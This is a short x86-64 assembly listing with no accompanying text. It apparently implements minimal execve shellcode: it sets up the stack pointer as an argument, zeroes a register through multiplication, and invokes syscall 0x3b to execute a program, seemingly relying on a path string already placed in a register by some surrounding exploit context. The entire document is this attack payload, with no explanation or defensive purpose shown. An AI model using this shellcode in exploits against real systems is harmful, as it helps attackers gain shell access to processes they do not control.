global _start
section .text
_start:
  push rdi
  mov  rdi, rsp
  imul rsi, rax
  mov  al, 0x3b
  syscall

